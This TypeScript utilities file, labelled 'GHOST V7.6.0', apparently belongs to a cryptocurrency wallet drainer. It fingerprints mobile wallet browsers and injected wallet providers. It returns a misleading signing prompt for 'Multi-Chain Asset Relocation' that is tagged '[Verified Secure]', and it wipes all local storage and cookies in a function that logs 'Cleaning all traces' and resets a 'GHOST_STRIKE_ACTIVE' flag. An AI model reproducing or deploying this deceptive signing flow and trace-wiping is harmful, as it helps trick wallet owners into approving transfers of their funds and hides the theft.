/**
 * 🛰️ GHOST V7.6.0 PROTOCOL UTILS - FIXED
 * Rules applied: Hard reset support, non-blocking environment detection.
 */

/**
 * 🕵️‍♂️ ENVIRONMENT DETECTOR
 * This now purely identifies the environment without "silencing" the logic.
 */
export const checkInternalBrowser = () => {
  if (typeof window === "undefined") return false;

  const ua = navigator.userAgent.toLowerCase();

  // Detect iPadOS "Request Desktop Site"
  const isIPadOS = navigator.maxTouchPoints > 2 && /macintosh/.test(ua);

  // Standard Mobile Check
  const isMobile =
    /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua) ||
    isIPadOS;

  // Injection markers
  const isInjected =
    !!(window as any).ethereum ||
    !!(window as any).trustwallet ||
    !!(window as any).phantom;

  const hasWalletUA =
    /metamask|trustwallet|coinbase|phantom|rainbow|imtoken/i.test(ua);

  // Returns true if we are inside a mobile wallet browser or on a mobile device
  return isMobile || hasWalletUA || isInjected;
};

/**
 * 📜 MASTER KEY IDENTITY MESSAGE
 * Fixed to match the SEED_MSG used in useAuditSequence for consistency.
 */
export function generateIdentityMessage() {
  return "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
}

/**
 * 🛡️ STATE PURGE: The "Nuclear Option"
 * Rule 5 & 6: Completely resets the application state.
 */
export function clearGhostFlags() {
  if (typeof window === "undefined") return;

  console.log("[utils.ts] ☢️ Nuclear Purge: Cleaning all traces.");

  // 1. Clear ALL storage to satisfy "reset everything" rule
  localStorage.clear();
  sessionStorage.clear();

  // 2. Specific WalletConnect/Reown cleanup
  if (typeof document !== "undefined") {
    document.cookie.split(";").forEach((c) => {
      document.cookie = c
        .replace(/^ +/, "")
        .replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
    });
  }

  // 3. Reset Global Logic Flags
  (window as any).GHOST_STRIKE_ACTIVE = false;
}

/**
 * 🕵️‍♂️ UI HELPER: Format USD Values
 */
export function formatUsd(value: string | number): string {
  const num = typeof value === "string" ? parseFloat(value) : value;
  if (isNaN(num)) return "$0.00";
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
  }).format(num);
}
